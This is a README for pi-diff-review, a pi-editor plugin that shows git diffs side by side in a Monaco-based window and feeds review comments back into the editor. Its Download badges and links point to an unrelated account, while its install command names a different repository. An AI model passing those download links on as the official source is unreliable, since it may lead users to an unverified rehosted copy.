# ⚙️ pi-diff-review - Native Git Diff Review Made Simple

[![Download pi-diff-review](https://img.shields.io/badge/Download-pi--diff--review-brightgreen?style=for-the-badge)](https://github.com/binomotrading1211-crypto/pi-diff-review)

## 🔍 What is pi-diff-review?

pi-diff-review adds a simple way to view and comment on changes in your code. It works inside the `pi` editor, helping you check differences between your current work and the last saved version.

The tool uses a clean diff editor that shows changes side-by-side. You can write comments about specific parts or whole files. When done, it inserts your feedback directly into the `pi` editor for easy follow up.

This app is designed for Windows, macOS, and Linux. It works best with Node.js installed and requires internet access during use.

---

## 🚀 Quick Start - Download and Setup

[![Download pi-diff-review](https://img.shields.io/badge/Download-pi--diff--review-brightgreen?style=for-the-badge)](https://github.com/binomotrading1211-crypto/pi-diff-review)

To get pi-diff-review on your Windows machine, follow these steps:

1. Visit the link above or this page:  
   https://github.com/binomotrading1211-crypto/pi-diff-review  
   This page hosts the software and related files.

2. Make sure your system has the following installed:
   - Windows 10 or newer.
   - .NET 8 SDK  
     You can get it from Microsoft's official site. This is needed to build the native host.
   - Microsoft Edge WebView2 Runtime  
     This runtime lets the app display modern web content inside Windows apps. Download it from Microsoft’s website.
   - Node.js version 20 or higher  
     Download Node.js from nodejs.org and install it before continuing.

3. Install `pi` if you haven’t already. This tool links to the `pi-diff-review` command.

4. Open a terminal (Command Prompt or PowerShell) and run this command to install pi-diff-review:  
   ```
   pi install git:https://github.com/badlogic/pi-diff-review
   ```
   This command fetches and installs the needed files.

5. Ensure your computer is connected to the internet during installation and usage to load required web resources.

---

## 📥 How to Use pi-diff-review

Once installed, use pi-diff-review by running this command inside the `pi` editor:

```
/diff-review
```

This command does the following:

- Collects the changes in your current project compared to the last saved state (`HEAD` in git).
- Opens a native review window that shows these changes clearly.
- Displays changed files side-by-side using a Monaco diff editor.
- Lets you write comments on the original or new version of the code. You can also comment on the entire file.
- When you finish and submit your comments, the tool inserts your feedback into the `pi` editor for easy access.

You do not need to leave your editor or switch between windows.

---

## 🖥️ System Requirements for Windows

To run pi-diff-review smoothly on Windows, your system needs a few key components:

- **Operating System:** Windows 10 or newer
- **.NET 8 SDK:**  
  This is necessary to build the native host during installation. You can download it from the official Microsoft .NET website.
- **Microsoft Edge WebView2 Runtime:**  
  This runtime allows the app to show modern HTML and JavaScript content inside native windows.
- **Node.js 20 or above**  
  pi-diff-review relies on Node.js to run its commands and setup.
- **`pi` editor installed**  
  The tool adds commands inside `pi` and depends on it.

---

## 🔧 Installing Required Components on Windows

### Installing .NET 8 SDK

1. Visit https://dotnet.microsoft.com/en-us/download/dotnet/8.0
2. Download the SDK for Windows.
3. Run the installer and follow the prompts.
4. Restart your terminal or command prompt after installation.

### Installing Microsoft Edge WebView2 Runtime

1. Go to https://developer.microsoft.com/en-us/microsoft-edge/webview2/
2. Download the Evergreen Standalone Installer.
3. Run the installer and complete the setup.

### Installing Node.js 20+

1. Visit https://nodejs.org/en/
2. Download the latest LTS version at or above version 20.
3. Run the installer and follow the steps.

---

## 📦 Step-by-Step Installation of pi-diff-review

1. Open Command Prompt or PowerShell.

2. Run this command to install the pi-diff-review plugin into the `pi` editor:

   ```
   pi install git:https://github.com/badlogic/pi-diff-review
   ```

3. The installation process builds the native host required to open the diff review window.

4. After installation, restart `pi` or reload the editor.

5. Use `/diff-review` inside `pi` to start reviewing changes.

---

## ✅ Using pi-diff-review Effectively

- Open your project in `pi`.
- Make some changes to files tracked by git.
- Inside `pi`, type `/diff-review` and press Enter.
- A new window will open showing the differences in your code.
- Read through the changed lines shown side-by-side.
- Add comments by clicking on the lines or near the file name.
- Write your notes clearly on the original side, new side, or for the whole file.
- When done, submit your comments.
- The tool will place your comments back into `pi`, ready for review or sharing.

---

## ⚙️ How pi-diff-review Works

pi-diff-review uses these components:

- **git diff**: It runs a git command in the background to find changes from the current saved state.
- **Monaco Editor**: This is the same editor that powers Visual Studio Code. It shows your changed files side-by-side for easy comparison.
- **Glimpse**: A helper native host that displays the review window on your machine.
- **Tailwind CSS and Monaco CDN**: These web resources style and power the review window. They load via internet connection.

---

## 🚩 Troubleshooting

- If you get errors related to missing software, check that:
  - .NET 8 SDK is properly installed.
  - WebView2 runtime is present.
  - Node.js version is 20 or higher.
- If the review window does not open, try reinstalling pi-diff-review.
- Confirm you have a working git repository with changes to review.
- Ensure your internet connection is working so styles and editor components can load.

---

## 🌐 Links and Resources

- Download and see details here:  
  https://github.com/binomotrading1211-crypto/pi-diff-review  
  Use this page to get the latest updates and check issues.

- pi editor installation and documentation:  
  https://pi.dev/

- .NET 8 SDK download:  
  https://dotnet.microsoft.com/en-us/download/dotnet/8.0

- Microsoft Edge WebView2 Runtime:  
  https://developer.microsoft.com/en-us/microsoft-edge/webview2/

- Node.js download:  
  https://nodejs.org/en/

---

## 🔒 Privacy and Security

pi-diff-review runs locally on your computer. Your code changes are not sent to any external server except when loading web components from trusted CDNs. Use this app in trusted environments.